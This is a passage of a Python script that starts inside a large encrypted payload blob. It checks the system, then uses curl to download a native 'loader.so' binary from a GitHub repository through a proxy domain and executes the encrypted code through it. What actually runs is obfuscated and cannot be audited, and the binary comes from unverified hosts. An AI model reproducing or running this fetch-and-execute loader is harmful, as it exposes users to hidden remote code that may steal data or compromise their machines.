lUFGX0NpFna2UZxD5PlESHEVIe3UUleDObnCxWJ0SrrBzysAox35Xj/t/qYfDAz3CFTXsrZ59FO6tneblznMYfEvJkw1bZeE0bGm8v91sPkB7mhyUTma6od5cD1DEP73fEV3/rhIOqp3TjyfzBXuy/NiPo7l2E6~Q166kF0T9WnkZGGJ6w23fEyi4k3BxvwrOM0b6ahgzZjvqF8li3vLZ89vmUdJcL1iSF22jk29l8Xckf7Uz~ajqfc9tizpD8s~2TL3Gy/FdTs5nI/yb/38~8D8DW88/agv4xTeYzQ0wlr7ihgnhuKeOyeFG8FZHM8H~AOjqNYky2gRdTd0F381mywHwOOJDFNk8zX4suXbChtFoyBwi6t2uo2eM60gzeWNvXAfVU8KxgZLRsQCImSXS9pxczkc0xmrDIluFDFXS/24uU062/EuoW1e1T6iZj5X2p2K48ARFLrEquY4/tzfZqDVSSqDX~suPMPHRxhzuobWsjH7pc3I9FMxAMckCakUbSWLFsQYUuYrT~wjNVLtv92Q/V~V/FGdsVelMhEjvxhvJ6NMfAotxC1Mg4XQTyQRoreMOCgbwozizuzi2eYbo1EJUJBfju~muSQaTmDccMAn1IWVG892Axir2OlIaSv51FVVPJpMXxE4gcDv8sd/OY4uvYMmhpEckxBX~9oXe/rZt0mHL6FKlmWqmYO90z3a7pcliB7jLOBntmJoJOeW/7dA8GjsLGxmDO/KyG3ci/5NWKAKC4/dGkjJyB0y5ZIFpAp2vVjzVWqFqYHA6OWj8Eet32t16SQ6CW1tcT5O2W~Qb3FuEGp/6dPGTCRygnygR5jz0QX4F8ZCLM9Ikr9K4XIE1r0QPonXJS1TgQLkoQ35c9x/aDSyf3qYW0w~r4l1ogxrLbDj1dGAiJ0G3EC7/RoY95Ykd1CH2keWeCizpPaVwf2IBABvc6SDd23ePh7uWvEL5j5gKdHh4Igpfm4aPG3eKwJpTpdWf0iKeITbBzatnhC~9EabI5Gq3SW9eefLA/SftDOTtxgAVmxnTa64y/ky~C1XnrGACgviT8~OO5vo6iinbxsUr/DMVNKIcipI5cO/MsLmdkCzFMzoez9leLagOr8eTl6BqvV9gVRmcAYiGK7R4uON7HSEV4deo1/N72d9DhaA4q9~fUr0OGviu~eAd6glyNZ4vGvEW64C0AC2w80n98iHGxBBTJx8~gnLu6ZLcmYplaXB7slsLWKgYxqa//sTPk5srxI1PJoJBzqUlnuNf2b5gExhIB6Sr1C46oW4HT61XfmNOhEfxw3MHapEYDQcpcjK2dyfglFXcidvnhAvnA/n7PdouTWE~gD4EKIKL2pz6ZL2a~KSQoO2kv4gw6MaXOezl4aSOEyDxb3C9GMii5juoJ2y~SGURKOAhTnpsYxL9l5yvaUqXj87bTx8sEzivzTVqqrgIpri82gSZRTnIeeNdsB64/AnwGHRMMdUbhbOJq9UQ4kxR8FIRuXg3ZTgxTtEzAywIQhlaPXMuNpWbqu7NQfvUk/AwapdFlKrnWIFcv98TdE5OizR/A3Wy575D4a5UvsV5GwaI7mhfykaQJzMct7fslkWjM7bmC6FI9FWACKYEWrpWcD3nBIC3dLtDV1yO2zqPssxcWGqGtG0GWeUo/d6czXqOS5NxLUcAYmm9F0N4hXqDsHU/dRv93k2Y8tSigYD2WwTeeuytWAa2juCantS~3nSVD/f51x8TRM1z9Gaifc9Kj6Ixa182PsQr3fBrPjMv62JwgYbrH/E0y3ma6rMlm1LnjRPag4N1ThfFCfSDmF2PtxQFUDlGFk56ZrRl/w5FoWPsJoD4qZh4rSox5vZZ5LZZRT~r897gMSpCaZDhGaVfXPgZ41AgisJrRJUUtoc1~tgbaG2APCIrZqt3T7gp5j7mqQY~fMboqg6RkyVBhqIlKjWey4~HAMvQZEv2K8upxMBXyz~k3NxRYSGJQwkzKXi3gvC0XhD/qyrtR8gsw3T7zgDlQsp8v92Y6mclsOYvVju6kv7yo4l58YqLVMxdeUV5/L5Oa9M7zDPKKsY7AzY1T9KxU4lIb1wN812dleU/y3UtbkPH9Ne98qwIEWX7nSyN8rgBElO49v~TECB10JTvUg~YaY3sC85REJ7DKU/rK8='}
function_name = 'main'

# 配置日志格式
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
logger = logging.getLogger(__name__)

@dataclass
class Config:
    """配置类"""
    SCRIPT_NAME: str = "ScriptName"  # 脚本名称
    PROXY_URL: str = 'https://git.365676.xyz'
    DEBIAN_URL: str = 'https://raw.githubusercontent.com/wyourname/wool/master/others'
    ALPINE_URL: str = 'https://raw.githubusercontent.com/wyourname/wool/master/others/alpine'
    
    def download_url(self, distro: str) -> str:
        """获取下载URL"""
        IF_ALPINE = "alpine" in distro.lower()
        do_url = self.DEBIAN_URL if not IF_ALPINE else self.ALPINE_URL
        if not self.PROXY_URL:
            return do_url
        proxy = self.PROXY_URL if self.PROXY_URL.endswith('/') else f"{self.PROXY_URL}/"
        return f"{proxy}{do_url}"

def handle_errors(func: Callable) -> Callable:
    """
    异常处理装饰器，用于统一捕获和处理异常
    """
    @wraps(func)
    def wrapper(*args, **kwargs):
        try:
            return func(*args, **kwargs)
        except Exception as e:
            logger.error(f"函数 {func.__name__} 执行出错: {str(e)}")
            raise  # 可以选择是否重新抛出异常
    return wrapper


def get_linux_distro():
    try:
        with open('/etc/os-release') as f:
            info = {}
            for line in f:
                if '=' in line:
                    k, v = line.strip().split('=', 1)
                    info[k] = v.strip('"')
            return info.get('NAME', 'Unknown'), info.get('VERSION_ID', '')
    except FileNotFoundError:
        return "Not Linux", ""

class EnvironmentChecker:
    """环境检查类"""
    SUPPORTED_PYTHON_VERSIONS = {9, 10, 11, 12}  # Python 3.x 支持的小版本
    SUPPORTED_OS = "Linux"
    SUPPORTED_ARCHITECTURES = {'x86_64', 'aarch64', 'armv8', 'armv7l'}
    
    @handle_errors
    async def check_system(self) -> Tuple[bool, Optional[str], Optional[Dict[str, str]]]:
        """检查系统环境"""
        v = sys.version_info
        os_type = platform.system()
        arch = platform.machine()
        
        system_info = {
            "python_version": f"{v.major}.{v.minor}.{v.micro}",
            "os_type": os_type,
            "architecture": arch
        }
        
        logger.info(f"系统信息: Python版本={system_info['python_version']}, "
                   f"操作系统={system_info['os_type']}, 处理器架构={system_info['architecture']}")
        
        if v.minor not in self.SUPPORTED_PYTHON_VERSIONS:
            return False, f"Python版本必须是3.{',3.'.join(map(str, self.SUPPORTED_PYTHON_VERSIONS))}中的一种", None
            
        if os_type != self.SUPPORTED_OS:
            return False, f"操作系统必须是{self.SUPPORTED_OS}", None
            
        if arch not in self.SUPPORTED_ARCHITECTURES:
            return False, f"处理器架构必须是{', '.join(self.SUPPORTED_ARCHITECTURES)}中的一种", None
            
        if arch in {'armv8', 'armv7l'}:
            logger.info("ARMv7,ARMv8请自行尝试")
            
        return True, None, system_info

class FileManager:
    """文件管理类"""
    def __init__(self, config: Config):
        self.config = config
        
    def get_so_filename(self, py_version: int, cpu_info: str) -> str:
        """获取.so文件名"""
        base_name = "loader"
        if cpu_info in ['aarch64', 'armv8']:
            arch = 'aarch64'
        elif cpu_info == 'x86_64':
            arch = cpu_info
        elif 'armv7' in cpu_info:
            arch = 'armv7'
        else:
            raise ValueError(f"不支持的CPU架构: {cpu_info}")  
        return f"{base_name}_3{py_version}_{arch}.so"
    
    @handle_errors
    async def download_file(self, filename: str) -> bool:
        """下载文件"""
        distro, version = get_linux_distro()
        logger.info(f"当前系统: {distro} {version}")
        logger.info(f"开始下载文件: {filename}")
        url = f"{self.config.download_url(distro=distro)}/{filename}"
        command = ['curl', '-#', '-o', 'loader.so', '-w', '%{http_code}', url]
        
        process = await asyncio.create_subprocess_exec(*command, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
        stdout, _ = await process.communicate()
        status_code = stdout.decode().strip()
        
        if status_code == '200' and process.returncode == 0:
            logger.info("文件下载成功: loader.so")
            return True
        else:
            logger.error(f"文件下载失败: HTTP状态码={status_code}")
            if os.path.exists('loader.so'):
                os.remove('loader.so')
            return False

@handle_errors
def execute_code(code_to_exec: str, name: str):
    """执行同步代码"""
    import loader
    loader.sync_code_loader(code_to_exec, name)

@handle_errors
def main():
    """主函数"""
    config = Config()
    checker = EnvironmentChecker()
    file_manager = FileManager(config)
    
    # 在同步函数中，我们需要一个事件循环来运行异步的check_system
    try:
        loop = asyncio.get_running_loop()
    except RuntimeError:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)

    is_valid, error_msg, system_info = loop.run_until_complete(checker.check_system())
    if not is_valid:
        logger.error(f"环境检查失败: {error_msg}")
        return

    py_version_str = f"3.{sys.version_info.minor}"
    encrypted_code = encrypted_data_dict.get(py_version_str)

    if not encrypted_code:
        logger.error(f"当前Python版本 {py_version_str} 不在支持的加密版本列表中: {list(encrypted_data_dict.keys())}")
        return
        
    if os.path.exists('loader.so'):
        logger.info("本地发现loader.so文件，准备执行")
        execute_code(encrypted_code, function_name)
        return
    
    py_version = sys.version_info.minor
    cpu_info = platform.machine()
    filename = file_manager.get_so_filename(py_version, cpu_info)
    logger.info(f"开始下载文件: {filename}")
    
    if loop.run_until_complete(file_manager.download_file(filename)):
        execute_code(encrypted_code, function_name)

if __name__ == '__main__':
    main()
# 当前脚本来自于http://script.345yun.cn脚本库下载！